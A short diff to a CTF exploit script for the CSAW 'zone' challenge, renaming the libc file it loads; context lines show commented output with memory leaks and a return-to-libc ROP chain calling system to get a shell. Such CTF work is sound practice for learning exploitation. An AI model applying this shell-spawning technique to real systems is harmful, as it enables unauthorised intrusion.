@@ -11,7 +11,7 @@ if args['GDB']:
     elf, libc = ELF('./zone'), io.libc
 elif args['REMOTE']:
     io = remote('pwn.chal.csaw.io', 5223)
-    elf, libc = ELF('./zone'), ELF('./libc-2.23.so')
+    elf, libc = ELF('./zone'), ELF('./libc-amd64-2.23-0ubuntu9.so')
 else:
     io = process(['stdbuf', '-i0', '-o0', '-e0', './zone'])
     elf, libc = ELF('./zone'), io.libc
@@ -93,7 +93,7 @@ io.interactive()
 #     Stack:    Canary found
 #     NX:       NX enabled
 #     PIE:      No PIE (0x400000)
-# [*] '/home/ubuntu/vbox/libc-2.23.so'
+# [*] '/home/ubuntu/vbox/libc-amd64-2.23-0ubuntu9.so'
 #     Arch:     amd64-64-little
 #     RELRO:    Partial RELRO
 #     Stack:    Canary found
@@ -102,7 +102,7 @@ io.interactive()
 # [+] stack leak address: 0x7ffd63409140
 # [+] libc leak address: 0x7efc0b64a830
 # [+] libc address: 0x7efc0b62a000
-# [*] Loaded cached gadgets for './libc-2.23.so'
+# [*] Loaded cached gadgets for './libc-amd64-2.23-0ubuntu9.so'
 # 0x0000:   0x7efc0b64b102 pop rdi; ret
 # 0x0008:   0x7efc0b7b6d17
 # 0x0010:   0x7efc0b66f390 system
